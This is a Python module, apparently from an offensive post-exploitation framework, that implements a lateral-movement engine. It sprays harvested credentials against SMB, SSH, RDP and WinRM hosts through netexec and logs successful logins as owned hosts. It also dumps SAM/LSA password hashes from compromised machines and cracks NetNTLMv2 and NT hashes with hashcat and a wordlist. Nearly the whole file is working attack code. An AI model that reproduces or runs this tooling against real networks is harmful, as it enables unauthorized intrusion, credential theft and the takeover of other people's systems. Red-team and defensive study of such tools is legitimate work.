"""Lateral-movement engine: credential spray + host dumps via netexec.

Turns harvested portal credentials into actual footholds by testing them
against discovered SMB / SSH / RDP / WinRM services on the target network.
Every validated pair is stored in the owned-host store and surfaced as an
OWNED event in the live stream. SAM/LSA dumps land in the hash vault, and
captured NetNTLMv2/NT tokens can be cracked straight from the dashboard
(hashcat -m 5600 / -m 1000 with the configured wordlist).
"""

import os
import re
import shutil
import subprocess
import threading
import time

from . import config
from . import state

_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')

# Legacy crackmapexec (v5):
#   [+] 10.10.10.10:445 - user:password
_SUCCESS_LEGACY = re.compile(
    r'\[\+\]\s*(\d+\.\d+\.\d+\.\d+)(?::\d+)?\s*-\s*([^\s:]+):([^\s]+)')

# Modern netexec: every row is prefix-padded on one line, and the credential
# comes after the [+] marker:
#   SMB   10.10.10.10    445    DESKTOP-ABC    [+] ACME\jsmith:Summer2025! (Pwn3d!)
#   SSH   10.0.0.5        22    NONE           [+] root:toor
_SUCCESS_NETEXEC = re.compile(
    r'\S+\s+(\d+\.\d+\.\d+\.\d+)\s+\d{1,5}\s+\S+\s+\[\+\]\s*'
    r'(?:([^\s:]*)\\)?([^\s:]+):([^\s]+)')

# netexec --sam / --lsa hash lines (hashcat -m 1000 material):
#   admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c:::
_NT_HASH_RE = re.compile(
    r'\b([A-Za-z0-9._$-]{1,64}):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\b')

_IP_RE = re.compile(r'\b(\d+\.\d+\.\d+\.\d+)\b')


def _parse_success(out):
    """Return (ip, user, password) on a valid-auth line, else None."""
    text = _ANSI_RE.sub('', out or '')
    m = _SUCCESS_LEGACY.search(text)
    if m:
        return m.group(1), m.group(2), m.group(3)
    m = _SUCCESS_NETEXEC.search(text)
    if m:
        domain, user, pwd = (m.group(2) or ''), m.group(3), m.group(4)
        if domain:
            user = '%s\\%s' % (domain, user)
        return m.group(1), user, pwd
    return None


def _parse_dump_hashes(out):
    """NT-hash lines (user:RID:LM:NT:::) from a netexec SAM/LSA dump."""
    text = _ANSI_RE.sub('', out or '')
    return ['%s:%s:%s:%s:::' % m.groups()
            for m in _NT_HASH_RE.finditer(text)]


def _attempts(pairs, targets, protos, limit):
    out = []
    for proto in protos:
        for user, pwd in pairs:
            out.append((proto.strip(), targets, user, pwd))
            if len(out) >= limit:
                return out
    return out


class LateralEngine(object):
    def __init__(self):
        self._lock = threading.Lock()
        self._busy = False

    def busy(self):
        with self._lock:
            return self._busy

    def _creds_pairs(self, user, password):
        """Manual pair when given, else the harvested portal credential set."""
        if user or password:
            return [(user or '', password or '')]
        seen = set()
        pairs = []
        for c in state.read_creds():
            u, p = c.get('username', ''), c.get('password', '')
            if u and p and (u, p) not in seen:
                seen.add((u, p))
                pairs.append((u, p))
        return pairs

    def _norm_targets(self, targets):
        if isinstance(targets, (list, tuple)):
            targets = ' '.join(str(t) for t in targets)
        return (targets or '').strip()

    def spray(self, targets, user, password, protos, limit=0):
        protos = [p.strip().lower() for p in (protos or 'smb').replace(',', ' ').split()
                  if p.strip() and p.strip().lower() in ('smb', 'ssh', 'rdp', 'winrm')]
        if not protos:
            protos = ['smb']
        if isinstance(targets, (list, tuple)):
            targets = ' '.join(str(t) for t in targets)
        targets = (targets or '').strip()
        if not targets:
            return {'ok': 0, 'error': 'target(s) required (CIDR or space-separated IPs)'}

        pairs = []
        if user or password:
            pairs = [(user or '', password or '')]
        else:
            seen = set()
            for c in state.read_creds():
                u, p = c.get('username', ''), c.get('password', '')
                if u and p and (u, p) not in seen:
                    seen.add((u, p))
                    pairs.append((u, p))
        if not pairs:
            return {'ok': 0, 'error': 'no credentials — capture some or pass user/pass'}
        if not limit:
            try:
                limit = int(state.read_settings().get('spray_limit')
                            or config.SPRAY_LIMIT)
            except (TypeError, ValueError):
                limit = config.SPRAY_LIMIT
        try:
            limit = min(int(limit), 60)
        except (TypeError, ValueError):
            limit = min(config.SPRAY_LIMIT, 60)

        plan = _attempts(pairs, targets, protos, limit)
        if not plan:
            return {'ok': 0, 'error': 'nothing to spray'}

        job = {
            'id': 'spray-%s-%s' % (time.strftime('%H%M%S'), os.getpid()),
            'kind': 'spray',
            'target': targets,
            'targets': [],
            'protos': protos,
            'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
            'started': time.time(),
            'status': 'running',
            'cmd': '%s <proto> %s -u <user> -p <pass>' % (config.NETEXEC_BIN, targets),
            'attempts': [],
            'owned': [],
            'error': '',
        }
        with self._lock:
            if self._busy:
                return {'ok': 0, 'error': 'spray already running'}
            self._busy = True
        state.put_scan(job)
        t = threading.Thread(target=self._worker, args=(job, plan), daemon=True)
        t.start()
        return {'ok': 1, 'id': job['id'], 'attempts': len(plan)}

    def _worker(self, job, plan):
        try:
            for proto, targets, user, pwd in plan:
                attempt = {'proto': proto, 'user': user, 'pass': pwd,
                           'ok': 0, 'msg': '', 'ip': ''}
                try:
                    proc = subprocess.run(
                        ['timeout', '25', config.NETEXEC_BIN, proto, targets,
                         '-u', user, '-p', pwd],
                        capture_output=True, text=True, timeout=40,
                        stdin=subprocess.DEVNULL)
                    out = (proc.stdout or '') + (proc.stderr or '')
                    hit = _parse_success(out)
                    if hit:
                        ip, userinfo, passw = hit
                        attempt.update({'ok': 1, 'ip': ip,
                                        'msg': userinfo + ':' + passw})
                        job['owned'].append({'ip': ip, 'proto': proto,
                                             'user': user, 'pass': pwd})
                        state.append_owned({
                            'ip': ip, 'proto': proto,
                            'user': user, 'pass': pwd, 'msg': (out or '').strip()[:200],
                        })
                        state.emit('OWNED', '%s:[%s] %s@%s (%s)' % (
                            proto, ip, user, userinfo, passw))
                    else:
                        attempt['msg'] = _truncate(out) or 'no valid creds'
                except Exception as exc:
                    attempt['msg'] = str(exc)
                job['attempts'].append(attempt)
                state.put_scan(job)
                if job['status'] == 'running':
                    state.emit('PROG', 'spray: %s [%s] %s' % (
                        attempt['proto'], attempt['ok'] and '+' or '-',
                        attempt['user']))
            job['status'] = 'done'
        except Exception as exc:
            job['status'] = 'error'
            job['error'] = str(exc)
        job['finished'] = time.time()
        state.put_scan(job)
        state.mirror_loot()
        with self._lock:
            self._busy = False
        owned = job['owned']
        state.emit('ALERT', 'spray finished: %d/%d valid%s' % (
            len(owned), len(job['attempts']), '!' if owned else ''))

    # --- SAM / LSA host dumps -------------------------------------------------
    def dump(self, targets, user, password, kind='sam'):
        """netexec --sam/--lsa with the spray credential model. Dumps land in
        the hash vault as hashcat -m 1000 tokens."""
        kind = kind if kind in ('sam', 'lsa') else 'sam'
        targets = self._norm_targets(targets)
        if not targets:
            return {'ok': 0, 'error': 'target(s) required (CIDR or space-separated IPs)'}
        pairs = self._creds_pairs(user, password)
        if not pairs:
            return {'ok': 0, 'error': 'no credentials — capture some or pass user/pass'}
        job = {
            'id': '%s-%s-%s' % (kind, time.strftime('%H%M%S'), os.getpid()),
            'kind': kind,
            'target': targets,
            'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
            'started': time.time(),
            'status': 'running',
            'cmd': '%s smb %s -u <user> -p <pass> --local-auth --%s'
                   % (config.NETEXEC_BIN, targets, kind),
            'attempts': [],
            'hashes': [],
            'error': '',
        }
        with self._lock:
            if self._busy:
                return {'ok': 0, 'error': 'a lateral job is already running'}
            self._busy = True
        state.put_scan(job)
        t = threading.Thread(target=self._dump_worker,
                             args=(job, targets, pairs, kind), daemon=True)
        t.start()
        return {'ok': 1, 'id': job['id']}

    def _dump_worker(self, job, targets, pairs, kind):
        try:
            for u, p in pairs:
                attempt = {'user': u, 'ok': 0, 'msg': '', 'hashes': 0}
                try:
                    proc = subprocess.run(
                        ['timeout', '45', config.NETEXEC_BIN, 'smb', targets,
                         '-u', u, '-p', p, '--local-auth', '--' + kind],
                        capture_output=True, text=True, timeout=60,
                        stdin=subprocess.DEVNULL)
                    out = (proc.stdout or '') + (proc.stderr or '')
                    m = _IP_RE.search(out)
                    src = '%s-dump %s' % (kind, m.group(1) if m else targets)
                    found = []
                    for tok in _parse_dump_hashes(out):
                        if tok in found:
                            continue
                        found.append(tok)
                        state.append_hash({
                            'kind': 'nt',
                            'src': src,
                            'token': tok,
                            'user': tok.split(':', 1)[0],
                        })
                    attempt['ok'] = 1 if found else 0
                    attempt['hashes'] = len(found)
                    job['hashes'].extend(found)
                    if found:
                        state.emit('HASH', '%s: %d hashes from %s' % (
                            kind.upper(), len(found), src))
                    else:
                        attempt['msg'] = _truncate(out) or 'no hashes'
                except Exception as exc:
                    attempt['msg'] = str(exc)
                job['attempts'].append(attempt)
                state.put_scan(job)
            job['status'] = 'done'
        except Exception as exc:
            job['status'] = 'error'
            job['error'] = str(exc)
        job['finished'] = time.time()
        state.put_scan(job)
        state.mirror_loot()
        with self._lock:
            self._busy = False
        n = len(job['hashes'])
        state.emit('ALERT', '%s dump finished: %d hashes%s' % (
            kind.upper(), n, '!' if n else ''))

    # --- NetNTLMv2 / NT hash crack ---------------------------------------------
    def crack_hashes(self):
        """hashcat (-m 5600 / -m 1000) over every uncracked vault token.

        Operator-armed like every other post-exp engine; recovered plaintexts
        are stamped back onto the hash entries and shown as CRACK events.
        """
        groups = {}
        for h in state.read_hashes():
            if not h.get('token') or h.get('pass'):
                continue
            k = h.get('kind') or 'ntlmv2'
            if k not in ('ntlmv2', 'nt'):
                continue
            groups.setdefault(k, []).append(h['token'])
        if not any(groups.values()):
            return {'ok': 0, 'error': 'no uncracked hashes in the vault'}
        binv = shutil.which(config.HASHCAT_BIN)
        if not binv:
            return {'ok': 0, 'error': '%s not installed' % config.HASHCAT_BIN}
        wl = state.crack_wordlist()
        if not wl:
            return {'ok': 0, 'error': 'no wordlist — install rockyou or set '
                                     'Settings → crack wordlist'}
        job = {
            'id': 'crack-%s-%s' % (time.strftime('%H%M%S'), os.getpid()),
            'kind': 'crack',
            'target': 'NetNTLMv2/NT vault',
            'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
            'started': time.time(),
            'status': 'running',
            'cmd': '%s -m 5600/1000 <tokens> %s' % (config.HASHCAT_BIN, wl),
            'cracked': 0,
            'error': '',
        }
        with self._lock:
            if self._busy:
                return {'ok': 0, 'error': 'a lateral job is already running'}
            self._busy = True
        state.put_scan(job)
        t = threading.Thread(target=self._crack_worker,
                             args=(job, binv, wl, groups), daemon=True)
        t.start()
        return {'ok': 1, 'id': job['id']}

    def _crack_worker(self, job, binv, wl, groups):
        potfile = os.path.join(config.STATE_DIR, 'hashcat.pot')
        total = 0
        modes = {'ntlmv2': '5600', 'nt': '1000'}
        try:
            for k, tokens in groups.items():
                tokens = [t for t in dict.fromkeys(tokens)]
                if not tokens:
                    continue
                tokfile = os.path.join(config.STATE_DIR, 'crack-%s.txt' % k)
                with open(tokfile, 'w') as fh:
                    fh.write('\n'.join(tokens) + '\n')
                subprocess.run(
                    ['timeout', str(config.CRACK_TIMEOUT), binv,
                     '-m', modes[k], '--potfile-path', potfile,
                     '--quiet', tokfile, wl],
                    capture_output=True, text=True,
                    timeout=config.CRACK_TIMEOUT + 30,
                    stdin=subprocess.DEVNULL)
                show = subprocess.run(
                    [binv, '-m', modes[k], '--potfile-path', potfile,
                     '--show', tokfile],
                    capture_output=True, text=True, timeout=60,
                    stdin=subprocess.DEVNULL)
                for line in ((show.stdout or '') + (show.stderr or '')).splitlines():
                    if ':' not in line:
                        continue
                    tok, pw = line.rsplit(':', 1)
                    tok = tok.strip()
                    if tok not in tokens or not pw:
                        continue
                    n = state.update_hashes(
                        lambda e: (e.get('token') or '') == tok,
                        {'pass': pw, 'cracked': time.strftime(
                            '%Y-%m-%d %H:%M:%S UTC')})
                    if n:
                        total += 1
                        state.emit('CRACK', 'hash cracked: %s = "%s"' % (
                            tok.split('::', 1)[0].split(':', 1)[0], pw))
                try:
                    os.remove(tokfile)
                except OSError:
                    pass
            job['status'] = 'done'
            job['cracked'] = total
        except Exception as exc:
            job['status'] = 'error'
            job['error'] = str(exc)
        job['finished'] = time.time()
        state.put_scan(job)
        state.mirror_loot()
        with self._lock:
            self._busy = False
        state.emit('ALERT', 'hash crack finished: %d/%d recovered%s' % (
            total, sum(len(v) for v in groups.values()),
            '!' if total else ''))


def _truncate(text, n=180):
    text = ' '.join((text or '').split())
    return text[:n]